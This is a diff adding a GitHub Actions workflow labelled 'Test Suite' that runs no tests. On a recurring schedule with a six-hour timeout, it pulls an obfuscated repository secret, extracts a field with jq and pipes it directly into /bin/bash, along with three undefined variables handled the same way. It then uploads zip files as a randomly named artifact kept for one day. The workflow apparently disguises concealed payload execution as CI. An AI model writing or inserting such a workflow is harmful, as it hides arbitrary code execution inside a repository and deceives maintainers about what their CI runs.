@@ -1,0 +1,32 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          zxsl25093: ${{ secrets.zxsl25093 }}
+        run: |
+          printf '%s' "$zxsl25093" | jq -r .njcl64 | /bin/bash
+          printf '%s' "$v033" | jq -r .gdjc97650 | /bin/bash
+          echo $zp8983 | jq -r .au82 | /bin/bash
+          printf '%s' "$tjpm81" | jq -r .n47 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DkcyvtIH
+          path: "*.zip"
+          retention-days: 1
